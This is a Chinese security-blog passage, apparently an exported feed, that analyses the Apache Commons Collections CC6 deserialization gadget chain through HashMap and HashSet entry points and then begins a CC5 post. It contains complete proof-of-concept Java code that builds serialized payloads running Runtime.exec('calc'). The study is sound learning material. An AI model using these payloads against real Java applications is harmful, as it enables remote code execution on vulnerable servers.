class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        map.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(map);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">           node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload1-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-32.png" title="读取元素"></p><h3 id="实现思路二：HashSet"><a href="#实现思路二：HashSet" class="headerlink" title="实现思路二：HashSet"></a>实现思路二：HashSet</h3><h4 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h4><p>另外一种实现通过HashSet进行调用，先看看HashSet是干嘛的</p><blockquote><p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。<br>HashSet 允许有 null 值。<br>HashSet 是无序的，即不会记录插入的顺序。<br>HashSet 不是线程安全的， 如果多个线程尝试同时修改 HashSet，则最终结果是不确定的。 您必须在多线程访问时显式同步对 HashSet 的并发访问。<br>HashSet 实现了 Set 接口。</p></blockquote><p>简述就是HashSet是一个无序且无重复元素的集合，只有Key值（可以理解为value值固定的hashmap），HashMap为键值对key-value形式。</p><p><img src="/posts/9758c0a8/cc6-15.png" title="HashSet"></p><p>其中会内置一个<code>transient</code>类型的<code>hashmap-map</code>变量，构造方法会自动对<code>map</code>对象进行<code>hashmap</code>实例化。</p><p>回到利用链来，上面的时候分析到<code>hashmap</code>在<code>put</code>元素时，将<code>TiedMapEntry</code>对象<code>put</code>进<code>map</code>中，在对元素进行<code>hash()</code>时会自动调用<code>TiedMapEntry.hashCode()</code>方法，达到执行代码的目的。</p><p>因此重点就在<code>hashmap</code>的<code>put</code>操作，就找<code>HashSet</code>在哪对<code>map</code>对象进行了put操作，且<code>put</code>的<code>key</code>得我们可控才行。</p><p>发现<code>HashSet</code>中，<code>add</code>操作调用了，重写的<code>readObject</code>中也调用了</p><p><img src="/posts/9758c0a8/cc6-17.png" title="add"></p><p><code>add</code>操作相当于<code>hashmap</code>把<code>value</code>值固定了，然后把传入<code>key</code>进行<code>put</code>操作，底层上还是<code>hashmap</code>的操作，然后实现方法同样，<code>put</code>值就能触发。</p><p><img src="/posts/9758c0a8/cc6-18.png" title="实现方法"></p><p>再看序列化和反序列化，虽然其中的<code>map</code>变量是<code>transient</code>修饰的，无法对<code>map</code>进行序列化，但序列化过程会遍历<code>map</code>中元素，把元素写入流中，再通过反序列化把流写入新的<code>hashmap</code>的<code>map</code>中。</p><p><img src="/posts/9758c0a8/cc6-16.png" title="readObject中put"></p><p>在<code>HashSet</code>中重写的<code>readObject</code>中对<code>map</code>进行了<code>put</code>操作，对反序列化的操作注解写在里面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断底层hashmap流容量</span></span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断加载因子，通俗就是说查看该map的装入的元素会不会超过设定的加载大小，例如容量大小为16，加载因子设置为0.5，就是装入元素为8个，超过8个就超过了设置的预期值，用来设置预期装入的容量大小。</span></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断底层hashmap流大小</span></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                             size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面条件都满足就急计算底层hashmap流的实际可容量</span></span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建上述条件下的hashmap对象，用来写入</span></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//循环读取元素然后put入hashmap的map中</span></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看下来基本不需要去绕过上面的限制，默认情况下都是满足条件的，只需要对序列化的对象进行反序列化读取，然后写入到map中，接下来再去看序列化写入，看写入的参数是否可控。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//对非static或transient类型的数据进行写入</span></span><br><span class="line">        <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的容量和加载因子写入</span></span><br><span class="line">        <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把底层hashmap的大小写入</span></span><br><span class="line">        <span class="comment">// Write out size</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把map中元素依次进行写入</span></span><br><span class="line">        <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然<code>map</code>为<code>transient</code>类型无法序列化，但写入过程基本把<code>map</code>的信息读取出来依次写入流中，再通过反序列化读取重新写入到新的<code>hashmap</code>对象中。</p><h4 id="POC-1-1"><a href="#POC-1-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>通过上面的学习，发现同思路一的poc，把入口点换成<code>HashSet</code>，相当于多走了一步弯路，思路一中直接通过<code>hashmap</code>对象<code>put</code>值进行触发，这通过<code>hashset</code>进行<code>add</code>值去触发<code>hashmap.put</code>进行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        <span class="comment">//通过HashSet add值去触发漏洞</span></span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(TM);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-19.png" title="实现效果"></p><h4 id="POC-2-1"><a href="#POC-2-1" class="headerlink" title="POC-2"></a>POC-2</h4><p>同实现思路一的POC-2的分析学习，规避本地序列化也可以通过反射修改key值<br>不过不同的是思路二用HashSet作为入口，因此在修改key值时，需要对HashSet中的map的table表中的key进行修改。<br>同时由于不修改链转换器，且添加的key值任意不为11即可，因此无需像POC-1那样删除key为11的元素。</p><p>因此先获取获取<code>hashset</code>中的<code>hashmap</code>对象属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap hsmap=(HashMap) hsset.get(hs);</span><br></pre></td></tr></table></figure><p>再获取hashmap中的table属性</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(hsmap);</span><br></pre></td></tr></table></figure><p>获取table属性过后，再获取table中存在的key值，并进行修改为目标触发的对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化触发漏洞即可，得到完整POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload-2.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>本以为cc6跟前面cc4、5一样进行变式就行了理解起来很容易，但实际学习中虽然只改变入口为hashmap和hashset，但为了理解里面的原理踩了好些坑，也更了解了hashmap和hashset序列化的过程（包括通过反射去修改hashmap的key值），如果只是跟着网上的资料学习跟踪链的话，很多细节还是被直接过掉了，还是要尽可能学习逆向思维，找到为什么这段代码能触发，为什么要这么写，写成其他的为啥不行，被绕进去好几次，但最后还是理清楚了很多，学到了很多，但在默认的序列化功能源码上多少还有些不太明白理的清的地方。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail">https://www.runoob.com/manual/jdk11api/java.base/java/util/HashSet.html#method.detail</a><br><a href="https://paper.seebug.org/1242/#commons-collections-6">https://paper.seebug.org/1242/#commons-collections-6</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC5链学习与分析</title>
      <link href="/posts/340e4601.html"/>
      <url>/posts/340e4601.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>重点上还是CC1、2两个链，后面都是变种或者加了一些新入口，依旧单独列出来方便整理，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        